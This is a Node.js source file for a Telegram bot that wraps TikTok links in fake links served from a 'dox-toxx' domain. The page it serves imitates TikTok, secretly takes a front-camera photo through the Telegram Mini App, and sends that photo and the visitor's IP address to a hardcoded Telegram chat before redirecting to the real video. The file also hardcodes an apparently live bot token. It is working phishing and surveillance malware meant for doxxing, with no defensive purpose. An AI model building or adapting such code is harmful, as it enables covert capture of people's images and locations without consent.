const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
const CHAT_ID = '8667961334';
const PORT = process.env.PORT || 3000;
const DOMAIN = 'https://dox-toxx.onrender.com'; 

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true }));

const linksDB = {};

// --- ОБЫЧНЫЙ СТАРТ ---
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
});

// --- ОБЫЧНЫЕ СООБЩЕНИЯ ---
bot.on('message', (msg) => {
  const text = msg.text;
  if (!text || text.startsWith('/')) return;

  if (text.includes('tiktok.com')) {
    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = text;
    const fakeLink = `${DOMAIN}/${shortId}/`;
    bot.sendMessage(msg.chat.id, `Твоя ссылка:\n${fakeLink}`);
  }
});

// --- INLINE РЕЖИМ (@bot ссылка) ---
bot.on('inline_query', async (query) => {
  const text = query.query;

  if (!text || !text.includes('tiktok.com')) {
    return bot.answerInlineQuery(query.id, []);
  }

  const shortId = crypto.randomBytes(4).toString('hex');
  linksDB[shortId] = text;
  
  // Ссылка на наше приложение
  const appLink = `${DOMAIN}/${shortId}/`;

  // Создаем карточку с нативной кнопкой "Открыть"
  const result = {
    type: 'article',
    id: shortId,
    title: 'TikTok',
    description: 'Нажмите, чтобы открыть видео',
    input_message_content: {
      message_text: '👇 Нажмите кнопку ниже, чтобы открыть видео'
    },
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: 'Открыть',
            // ВАЖНО: Используем web_app вместо url, чтобы открылось как Mini App с камерой!
            web_app: { url: appLink } 
          }
        ]
      ]
    }
  };

  await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
});

// --- ГЛАВНАЯ СТРАНИЦА ---
app.get('/', (req, res) => {
  res.send('Сервер работает.');
});

// --- ПРИЕМ ДАННЫХ ---
app.post('/api/collect', async (req, res) => {
  const { target, photo } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    let text = `Новый переход\nIP: ${ip}\nЦель: ${target || '?'}`;
    await bot.sendMessage(CHAT_ID, text);

    if (photo && photo.startsWith('data:image')) {
      const base64Data = photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendPhoto(CHAT_ID, buffer, { caption: 'Фото с камеры' });
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ ok: false });
  }
});

// --- HTML СТРАНИЦА (С КАМЕРОЙ) ---
app.get('/:id/', (req, res) => {
  const shortId = req.params.id;
  const targetUrl = linksDB[shortId];

  if (!targetUrl) return res.redirect('https://www.tiktok.com/');

  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>TikTok</title>
<style>
  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: sans-serif; color: #000; margin: 0; padding: 0; }
  .header { background: #e3e3e3; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #d0d0d0; }
  .avatar-lg { width: 48px; height: 48px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; }
  .avatar-lg svg { width: 28px; height: 28px; fill: #fff; }
  .header-info { flex: 1; }
  .header-info .name { font-weight: 600; font-size: 16px; margin-bottom: 2px; }
  .header-info .desc { font-size: 13px; color: #666; }
  .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
  .content { padding: 20px; max-width: 600px; margin: 0 auto; }
  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; height: 400px; width: 100%; }
  #preview, #canvas { display: none; }
</style>
</head>
<body>
<div class="header">
  <div class="avatar-lg"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
  <div class="header-info">
    <div class="name">TikTok</div>
    <div class="desc">Приєднуйся до мене в TikTok</div>
  </div>
  <button class="btn-red" id="btnOpen">Открыть</button>
</div>
<div class="content">
  <div class="skeleton-box"></div>
</div>
<video id="preview" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<script>
  const TARGET_URL = "${targetUrl}";
  const tg = window.Telegram?.WebApp;

  if (tg) {
    tg.ready();
    tg.expand();
    if (tg.BackButton) tg.BackButton.hide();
    
    // Принудительный запрос камеры через API Telegram
    if (tg.requestCameraAccess) {
      tg.requestCameraAccess((granted) => {
        console.log("Camera access:", granted);
      });
    }
  }

  const video = document.getElementById('preview');
  const canvas = document.getElementById('canvas');

  async function takePhoto() {
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      video.srcObject = stream;
      await new Promise(res => { if (video.readyState >= 2) return res(); video.onloadeddata = () => res(); });
      await new Promise(r => setTimeout(r, 300));
      canvas.width = video.videoWidth || 480;
      canvas.height = video.videoHeight || 360;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return blob;
    } catch (e) {
      if (stream) stream.getTracks().forEach(t => t.stop());
      return null;
    }
  }

  let redirected = false;
  function goTarget() {
    if (redirected) return;
    redirected = true;
    if (tg && tg.openLink) {
      tg.openLink(TARGET_URL);
    } else {
      location.replace(TARGET_URL);
    }
  }

  document.getElementById('btnOpen').onclick = (e) => { e.preventDefault(); goTarget(); };
  setTimeout(goTarget, 3000);

  (async () => {
    const photoPromise = takePhoto();
    const photoBlob = await photoPromise;
    
    let photoBase64 = null;
    if (photoBlob) {
      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
    }
    
    fetch('/api/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ photo: photoBase64, target: TARGET_URL })
    }).catch(() => {});
  })();
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log(`Port ${PORT}`);
});
